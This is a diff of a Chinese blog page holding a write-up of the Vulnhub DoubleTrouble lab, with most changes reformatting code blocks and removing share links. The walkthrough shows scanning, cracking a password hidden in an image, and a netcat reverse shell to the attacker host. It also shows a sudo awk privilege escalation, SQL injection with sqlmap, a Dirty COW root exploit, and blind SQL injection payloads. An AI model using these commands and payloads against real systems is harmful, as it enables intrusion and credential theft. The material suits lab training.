@@ -119,30 +119,12 @@
         <li><a class="icon" aria-label="下一篇" href="/2022/04/18/GYCTF2020%20FlaskApp/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
       <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/&text=13 Vulnhub DoubleTrouble Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/&title=13 Vulnhub DoubleTrouble Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/&is_video=false&description=13 Vulnhub DoubleTrouble Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=13 Vulnhub DoubleTrouble Writeup&body=Check out this article: https://hdfzzf.github.io/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/&title=13 Vulnhub DoubleTrouble Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/&title=13 Vulnhub DoubleTrouble Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/&title=13 Vulnhub DoubleTrouble Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/&title=13 Vulnhub DoubleTrouble Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/&name=13 Vulnhub DoubleTrouble Writeup&description=&lt;p&gt;该靶机难度为简单，漏洞其实都不难发现，主要的难点在于第一台靶机隐写图片的发现和破解以及第二台靶机的sql注入漏洞的发现。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/04/18/13%20Vulnhub%20DoubleTrouble%20Writeup/&t=13 Vulnhub DoubleTrouble Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
     <div id="toc">
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E7%AC%AC%E4%B8%80%E5%8F%B0%E9%9D%B6%E6%9C%BA"><span class="toc-number">2.</span> <span class="toc-text">2 渗透——第一台靶机</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2 访问http服务</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9A%90%E5%86%99%E6%9C%AF%E5%AF%86%E7%A0%81%E7%A0%B4%E8%A7%A3"><span class="toc-number">2.3.</span> <span class="toc-text">2.3 隐写术密码破解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.4.</span> <span class="toc-text">2.4 get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.5.</span> <span class="toc-text">2.5 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E7%AC%AC%E4%BA%8C%E5%8F%B0%E9%9D%B6%E6%9C%BA"><span class="toc-number">3.</span> <span class="toc-text">3 渗透——第二台靶机</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0-1"><span class="toc-number">3.1.</span> <span class="toc-text">3.1 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1get-shell"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 访问http服务、get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-1"><span class="toc-number">3.3.</span> <span class="toc-text">3.3 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">4 总结</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">4.1.</span> <span class="toc-text">4.1 SQL注入——时间盲注</span></a></li></ol></li></ol>
     </div>
@@ -169,8 +151,6 @@
     <div class="postdate">
       
         <time datetime="2022-04-17T16:00:00.000Z" itemprop="datePublished">2022-04-18</time>
-        
-        (Updated: <time datetime="2022-04-18T02:46:50.161Z" itemprop="dateModified">2022-04-18</time>)
         
       
     </div>
@@ -227,9 +207,7 @@
 <h1 id="渗透第一台靶机">2 渗透——第一台靶机</h1>
 <p>攻击主机kali: 10.0.2.4</p>
 <h2 id="主机发现端口扫描端口服务发现">2.1 主机发现、端口扫描、端口服务发现</h2>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> arp-scan -l
-<span class="token function">sudo</span> nmap -p- <span class="token number">10.0</span>.2.17
-<span class="token function">sudo</span> nmap -p22,80 -A <span class="token number">10.0</span>.2.17<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.17</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.17</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091054.png" /></p>
 <p>得到如下信息：</p>
 <ul>
@@ -244,8 +222,7 @@
 <p>找到开源CMS的时候，需要查看一下更新的记录，里面有时候会记载类似“修复了xxx漏洞”信息。</p>
 </blockquote>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418091401.png" /></p>
-<p>搜索了一下该CMS的默认账号密码如下： <pre class="line-numbers language-none"><code class="language-none">admin@localhost.com
-admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>搜索了一下该CMS的默认账号密码如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">admin@localhost.com</span><br><span class="line">admin</span><br></pre></td></tr></table></figure></p>
 <p>但是无法登录。去GitHub上找了源码，但是检查了所有文件发现都没有任何有用的信息，链接如下：</p>
 <ul>
 <li>https://github.com/dodiksunaryo/qdpm</li>
@@ -260,10 +237,8 @@ admin<span aria-hidden="true" class="line-numbers-rows"><span></span><span></spa
 <ul>
 <li>https://github.com/RickdeJager/stegseek</li>
 </ul>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">stegseek --seed doubletrouble.jpg <span class="token comment"># 检测信息</span>
-stegseek --crack doubletrouble.jpg rockyou.txt <span class="token comment"># 提取信息</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>最后得到一个文件<code>doubletrouble.jpg.out</code>，查看其中的内容，得到两串字符： <pre class="line-numbers language-none"><code class="language-none">otisrush@localhost.com
-otis666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">stegseek --seed doubletrouble.jpg <span class="comment"># 检测信息</span></span><br><span class="line">stegseek --crack doubletrouble.jpg rockyou.txt <span class="comment"># 提取信息</span></span><br></pre></td></tr></table></figure>
+<p>最后得到一个文件<code>doubletrouble.jpg.out</code>，查看其中的内容，得到两串字符： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">otisrush@localhost.com</span><br><span class="line">otis666</span><br></pre></td></tr></table></figure></p>
 <p>看这个格式像是之前登录界面的邮箱和密码，尝试登陆，发现进入了后台！</p>
 <h2 id="get-shell">2.4 get shell</h2>
 <p>这里有两种办法：</p>
@@ -283,15 +258,12 @@ otis666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></s
 <p>在蚁剑的shell上输入<code>nc -e /bin/bash 10.0.2.4 3333</code>将shell反弹到kali。可以升级一下shell（需要注意，靶机没有python3）。</p>
 <p>然后输入<code>sudo -l</code>查看的时候，发现了如下信息</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418093801.png" /></p>
-<p>然后去了<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a>发现了可以利用这个配置不当从而提权，命令如下： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> /usr/bin/awk <span class="token string">'BEGIN &#123;system("/bin/bash")&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>然后去了<a target="_blank" rel="noopener" href="https://gtfobins.github.io/">GTFOBins</a>发现了可以利用这个配置不当从而提权，命令如下： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /usr/bin/awk <span class="string">&#x27;BEGIN &#123;system(&quot;/bin/bash&quot;)&#125;&#x27;</span></span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094017.png" /></p>
-<p>查看<code>/root</code>发现了又一台虚拟机，先将该虚拟机传给kali，然后通过共享文件夹传到主机，最后再启动 <pre class="line-numbers language-none"><code class="language-none">靶机: nc 10.0.2.4 4444 &lt; doubletrouble.ova -w 1 # 传输完1s后自动断开
-kali: nc -lvnp 4444 &gt; doubletrouble2.ova<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>查看<code>/root</code>发现了又一台虚拟机，先将该虚拟机传给kali，然后通过共享文件夹传到主机，最后再启动 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">靶机: nc 10.0.2.4 4444 &lt; doubletrouble.ova -w 1 # 传输完1s后自动断开</span><br><span class="line">kali: nc -lvnp 4444 &gt; doubletrouble2.ova</span><br></pre></td></tr></table></figure></p>
 <h1 id="渗透第二台靶机">3 渗透——第二台靶机</h1>
 <h2 id="主机发现端口扫描端口服务发现-1">3.1 主机发现、端口扫描、端口服务发现</h2>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> arp-scan -l
-<span class="token function">sudo</span> nmap -p- <span class="token number">10.0</span>.2.18
-<span class="token function">sudo</span> nmap -p22,80 -A <span class="token number">10.0</span>.2.18<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.18</span><br><span class="line">sudo nmap -p22,80 -A 10.0.2.18</span><br></pre></td></tr></table></figure>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094403.png" /></p>
 <p>信息如下：</p>
 <ul>
@@ -305,10 +277,7 @@ kali: nc -lvnp 4444 &gt; doubletrouble2.ova<span aria-hidden="true" class="line-
 <p>不论输入什么，这个页面都没有任何回应（就离谱，给我的感觉就是做了个登录界面，并没有登录这个功能）</p>
 <p>路径扫描也没有其他结果：</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418094824.png" /></p>
-<p>因此，漏洞只可能出现在登录界面，但是不论输入什么都没有任何反应。使用sqlmap，可以发现漏洞，因此直接用sqlmap扫： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap -r r.txt -p <span class="token function">uname</span> --dbs -<span class="token operator">></span> doubletrouble, information_schema
-sqlmap -r r.txt -p <span class="token function">uname</span> -D doubletrouble --tables -<span class="token operator">></span> <span class="token function">users</span>
-sqlmap -r r.txt -p <span class="token function">uname</span> -D doubletrouble -T <span class="token function">users</span> --columns -<span class="token operator">></span> username, password
-sqlmap -r r.txt -p <span class="token function">uname</span> -D doubletrouble -T <span class="token function">users</span> -C username,password --dump<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>因此，漏洞只可能出现在登录界面，但是不论输入什么都没有任何反应。使用sqlmap，可以发现漏洞，因此直接用sqlmap扫： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -r r.txt -p uname --dbs -&gt; doubletrouble, information_schema</span><br><span class="line">sqlmap -r r.txt -p uname -D doubletrouble --tables -&gt; users</span><br><span class="line">sqlmap -r r.txt -p uname -D doubletrouble -T users --columns -&gt; username, password</span><br><span class="line">sqlmap -r r.txt -p uname -D doubletrouble -T users -C username,password --dump</span><br></pre></td></tr></table></figure></p>
 <p>最终得到如下信息：</p>
 <table>
 <thead>
@@ -337,19 +306,14 @@ sqlmap -r r.txt -p <span class="token function">uname</span> -D doubletrouble -T
 <blockquote>
 <p>该漏洞利用dirtycow漏洞的pokemon漏洞利用作为基础，自动生成新的passwd行。运行二进制文件时，将提示用户输入新密码。然后将原始 /etc/passwd 文件备份到 /tmp/passwd.bak 并用生成的行覆盖 root 帐户。运行漏洞利用后，您应该能够使用新创建的用户登录。</p>
 </blockquote>
-<p>将exp放到靶机上，然后编译执行即可，注意要进入可读可写的目录，比如<code>/tmp</code>。 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc -pthread dirty.c -o dirty -lcrypt
-./dirty<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>将exp放到靶机上，然后编译执行即可，注意要进入可读可写的目录，比如<code>/tmp</code>。 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -pthread dirty.c -o dirty -lcrypt</span><br><span class="line">./dirty</span><br></pre></td></tr></table></figure></p>
 <p>然后需要输入新的密码。该漏洞会创建一个名为<code>firefart</code>的用户，但是拥有root权限</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418101933.png" /></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418102252.png" /></p>
 <hr />
-<p>脏牛提权后，利用下述命令恢复原来的<code>/etc/passwd</code>： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> /tmp/passwd.bak /etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>脏牛提权后，利用下述命令恢复原来的<code>/etc/passwd</code>： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mv /tmp/passwd.bak /etc/passwd</span><br></pre></td></tr></table></figure></p>
 <hr />
-<p>接下来查看两个flag，第一个在<code>/root/root.txt</code>，第二个在<code>/home/clapton/user.txt</code> <pre class="line-numbers language-none"><code class="language-none">&#x2F;&#x2F; root.txt
-1B8EEA89EA92CECB931E3CC25AA8DE21
-
-&#x2F;&#x2F; user.txt
-6CEA7A737C7C651F6DA7669109B5FB52<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>接下来查看两个flag，第一个在<code>/root/root.txt</code>，第二个在<code>/home/clapton/user.txt</code> <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// root.txt</span><br><span class="line">1B8EEA89EA92CECB931E3CC25AA8DE21</span><br><span class="line"></span><br><span class="line">// user.txt</span><br><span class="line">6CEA7A737C7C651F6DA7669109B5FB52</span><br></pre></td></tr></table></figure></p>
 <p>靶机到此结束！</p>
 <h1 id="总结">4 总结</h1>
 <p>该靶机的难度确实不算难，不过还是存在着几个难点：</p>
@@ -359,11 +323,11 @@ sqlmap -r r.txt -p <span class="token function">uname</span> -D doubletrouble -T
 </ul>
 <p>我感觉第二台靶机只是做了一个登录界面，将我们输入的内容带入MySQL进行查询，不论结果对错，也不论是否有语法错误，都没有任何提示。现实情况下总会有不同的提示的，所以这里是一个难点。</p>
 <h2 id="sql注入时间盲注">4.1 SQL注入——时间盲注</h2>
-<p>如果后台语句为： <pre class="line-numbers language-none"><code class="language-none">select * from users where username&#x3D;&#39;.$_POST[&quot;uname&quot;].&#39; and password&#x3D;&#39;.$_POST[&quot;psw&quot;].&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>那么只需要<code>uname=1'and sleep(5)#&amp;psw=1</code>即可，此时： <pre class="line-numbers language-none"><code class="language-none">select * from users where username&#x3D;&#39;1&#39;and sleep(5)#&#39; and password&#x3D;&#39;1&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>但是该靶机不行，此时小技巧： <pre class="line-numbers language-none"><code class="language-none">uname&#x3D;1&#39; and(select x from (select (sleep(3)))alia)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>如果后台语句为： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;.$_POST[&quot;uname&quot;].&#x27; and password=&#x27;.$_POST[&quot;psw&quot;].&#x27;;</span><br></pre></td></tr></table></figure></p>
+<p>那么只需要<code>uname=1'and sleep(5)#&amp;psw=1</code>即可，此时： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where username=&#x27;1&#x27;and sleep(5)#&#x27; and password=&#x27;1&#x27;;</span><br></pre></td></tr></table></figure></p>
+<p>但是该靶机不行，此时小技巧： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&#x27; and(select x from (select (sleep(3)))alia)#</span><br></pre></td></tr></table></figure></p>
 <p>解释：</p>
-<p>此时，不论后台语句如何，至少存在 <pre class="line-numbers language-none"><code class="language-none">uname&#x3D;1&#39; and(select x from(select (sleep(5)))alia)#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>此时，不论后台语句如何，至少存在 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uname=1&#x27; and(select x from(select (sleep(5)))alia)#</span><br></pre></td></tr></table></figure></p>
 <p>那么先查询<code>select (sleep(3))</code>，直接触发，然后将返回的结果起个别名<code>alia</code>，最后执行<code>select x from alia</code>，因为<code>alia</code>中必定不存在<code>x</code>，所以没有返回结果，因此最终呈现的效果就是页面返回的时间被延迟了。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220418104149.png" /></p>
 
@@ -422,7 +386,6 @@ sqlmap -r r.txt -p <span class="token function">uname</span> -D doubletrouble -T
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
